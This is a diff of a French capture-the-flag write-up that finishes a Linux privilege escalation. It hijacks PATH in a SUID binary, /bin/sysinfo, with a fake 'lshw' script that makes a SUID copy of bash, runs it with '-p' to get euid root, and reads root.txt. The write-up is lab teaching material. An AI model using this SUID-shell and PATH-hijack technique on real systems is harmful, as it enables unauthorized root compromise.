@@ -1357,7 +1357,6 @@ Le faux `lshw` devient alors :
 cat > /dev/shm/lshw << 'EOF'
 #!/bin/bash
 cp /bin/bash /var/tmp/bashroot
-chown root:root /var/tmp/bashroot
 chmod 4755 /var/tmp/bashroot
 EOF
 ```
@@ -1381,14 +1380,31 @@ La sortie confirme qu’elle appartient à `root` et qu’elle possède le bit S
 -rwsr-xr-x 1 root root 1113504 Jul 10 01:40 /var/tmp/bashroot
 ```
 
+Tu exécutes ensuite cette copie avec l’option `-p` afin que Bash conserve les privilèges effectifs obtenus grâce au bit SUID :
+
+```bash
+/var/tmp/bashroot -p
+```
+
+La commande `id` confirme que l’UID réel reste celui de `theseus`, tandis que l’UID effectif devient celui de `root` :
+
+```bash
+id
+uid=1000(theseus) gid=1000(theseus) euid=0(root) groups=1000(theseus),100(users)
+```
+
+### 
+
 ### Lecture de root.txt
+
+Le shell dispose désormais des privilèges nécessaires pour lire le fichier final :
 
 ```bash
 bashroot-4.4# cat /root/root.txt
 3ff3xxxxxxxxxxxxxxxxxxxxxxxxxxxxd8d4
 ```
 
-
+La compromission de la machine est maintenant terminée : l’accès initial a été obtenu, puis les privilèges de `root` ont été acquis grâce au détournement du `PATH` dans le binaire SUID `/bin/sysinfo`.
 
 ## Conclusion
 
